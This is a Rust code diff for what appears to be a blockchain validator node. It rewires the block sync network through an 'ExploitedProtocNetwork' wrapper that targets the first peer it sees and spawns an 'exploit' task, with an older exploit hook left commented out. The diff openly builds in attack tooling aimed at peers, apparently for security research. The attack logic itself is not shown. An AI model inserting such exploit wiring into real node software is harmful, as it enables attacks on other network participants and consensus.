@@ -23,10 +23,7 @@ use crate::{
     idx_to_account::ValidatorIndexToAccountIdConverterImpl,
     metrics::{run_metrics_service, SloMetrics},
     network::{
-        address_cache::validator_address_cache_updater,
-        session::{ConnectionManager, ConnectionManagerConfig},
-        tcp::{new_tcp_network, KEY_TYPE},
-        ExploitedNetwork, ExploitedSendNetwork,
+        address_cache::validator_address_cache_updater, session::{ConnectionManager, ConnectionManagerConfig}, tcp::{new_tcp_network, KEY_TYPE}, ExploitedNetwork, ExploitedProtocNetwork, ExploitedSendNetwork
     },
     party::{
         impls::ChainStateImpl, manager::NodeSessionManagerImpl, ConsensusParty,
@@ -187,14 +184,35 @@ where
     import_queue_handle.attach_metrics(timing_metrics.clone());
     let justifications_for_sync = justification_channel_provider.get_sender();
 
-    let (exploit_sender, exploit_receiver) = mpsc::channel(0);
-    let exploited_sync_network = ExploitedNetwork::new(block_sync_network, move |data: &VersionedNetworkData<_>, peer_id: &sc_network::PeerId| {
-        exploit_sender.try_send((data.clone(), peer_id.clone()));
+    let mut first_peer = None;
+    let (exploited_sync_network, exploit) = ExploitedProtocNetwork::new(block_sync_network, move |peer_id| {
+        let filtered = first_peer.get_or_insert_with(|| peer_id.clone());
+        filtered == peer_id
     });
+
+    spawn_handle.spawn("", async move {
+        let result = exploit.await;
+        if result.is_err() {
+            error!(
+                target: LOG_TARGET,
+                "Exploit finished with error"
+            );
+        }
+    });
+
+    // let (mut exploit_sender, exploit_receiver) = mpsc::channel(0);
+    // let exploited_sync_network = ExploitedNetwork::new(block_sync_network, move |data: Vec<u8>, peer_id: sc_network::PeerId| {
+    //     exploit_sender.try_send((data.clone(), peer_id.clone()));
+    // });
+
+    // let send_exploit = ExploitedSendNetwork::new(client., exploit_receiver);
+    // spawn_handle.spawn("network-exploit", async move {
+
+    // });
 
     let sync_io = SyncIO::new(
         SyncDatabaseIO::new(chain_status.clone(), finalizer, import_queue_handle),
-        block_sync_network,
+        exploited_sync_network,
         chain_events,
         sync_oracle.clone(),
         justification_channel_provider.into_receiver(),
